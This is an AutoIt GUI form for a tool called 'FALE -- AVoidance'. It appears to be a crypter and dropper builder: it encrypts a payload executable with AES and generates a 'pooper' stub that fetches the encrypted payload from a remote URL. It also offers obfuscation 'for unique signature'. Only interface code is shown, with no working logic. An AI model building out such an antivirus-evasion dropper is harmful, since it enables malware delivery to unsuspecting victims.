#include <ButtonConstants.au3>
#include <ComboConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <TabConstants.au3>
#include <WindowsConstants.au3>
#include <GuiTab.au3>

#Region ### START Koda GUI section ### Form=c:\users\evan\documents\form1.kxf
$Form1_1 = GUICreate("FALE -- AVoidance", 448, 439, 278, 156)
$Tab1 = GUICtrlCreateTab(8, 8, 433, 425)
$TabSheet1 = GUICtrlCreateTabItem("Encrypt Payload")
$Group1 = GUICtrlCreateGroup("", 16, 32, 417, 393)
$Label1 = GUICtrlCreateLabel("Payload executable location:", 25, 55, 140, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$Label3 = GUICtrlCreateLabel("Output directory:", 25, 103, 82, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$txtPayload = GUICtrlCreateInput("", 24, 72, 313, 21)
$txtOutput = GUICtrlCreateInput("", 24, 120, 313, 21)
$btnPayloadBrowse = GUICtrlCreateButton("Browse", 344, 72, 73, 25)
$btnOutputBrowse = GUICtrlCreateButton("Browse", 344, 120, 73, 25)
$Label2 = GUICtrlCreateLabel("AES Key:", 25, 151, 49, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$txtAES = GUICtrlCreateInput("", 24, 168, 185, 21)
$btnMakeItSo = GUICtrlCreateButton("MAKE IT SO", 304, 368, 113, 41)
$Label5 = GUICtrlCreateLabel("* must match your pooper.", 216, 168, 127, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$TabSheet2 = GUICtrlCreateTabItem("Generate Pooper")
GUICtrlSetState(-1,$GUI_SHOW)
$Group2 = GUICtrlCreateGroup("", 16, 32, 417, 393)
$Label4 = GUICtrlCreateLabel("Encrypted payload URL:", 25, 151, 120, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$txtEncPayloadURL = GUICtrlCreateInput("http://4channel.biz/0000.enc", 24, 168, 393, 21)
$Label6 = GUICtrlCreateLabel("Final executable filename (leave blank for random):", 25, 199, 243, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$txtFinalExe = GUICtrlCreateInput("", 24, 216, 217, 21)
$Label7 = GUICtrlCreateLabel("Output directory:", 25, 55, 82, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$txtPOutput = GUICtrlCreateInput("", 24, 72, 313, 21)
$Label8 = GUICtrlCreateLabel("Pooper filename:", 25, 103, 83, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$txtPooperFilename = GUICtrlCreateInput("lolpooer.exe", 24, 120, 217, 21)
$Label9 = GUICtrlCreateLabel("AES key:", 25, 247, 48, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$txtPAES = GUICtrlCreateInput("", 24, 264, 217, 21)
$btnPOutputBrowse = GUICtrlCreateButton("Browse", 344, 72, 73, 25)
$btnPooperGen = GUICtrlCreateButton("MAKE IT SO", 304, 368, 113, 41)
$Label10 = GUICtrlCreateLabel("* must match your payload.", 248, 266, 131, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$cboArchitecture = GUICtrlCreateCombo("x86", 256, 120, 49, 25, BitOR($CBS_DROPDOWN,$CBS_AUTOHSCROLL))
GUICtrlSetData(-1, "x86|x64")
$Label11 = GUICtrlCreateLabel("Architecture:", 257, 103, 64, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$btnAU3WrapperBrowse = GUICtrlCreateButton("Browse", 224, 368, 73, 25)
$txtAU3Wrapper = GUICtrlCreateInput("C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2exe.exe", 24, 368, 193, 21)
$Label12 = GUICtrlCreateLabel("Aut2exe location:", 25, 351, 82, 17)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$Group3 = GUICtrlCreateGroup("Options", 24, 294, 393, 49)
GUICtrlSetBkColor(-1, 0xFFFFFF)
$chkObfuscate = GUICtrlCreateCheckbox("Obfuscate (for unique signature)", 40, 314, 185, 17)
$chkSharpie = GUICtrlCreateCheckbox("Insert Sharpie", 232, 314, 193, 17)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUICtrlCreateTabItem("")

#EndRegion ### END Koda GUI section ###

#EndRegion ### END Koda GUI section ###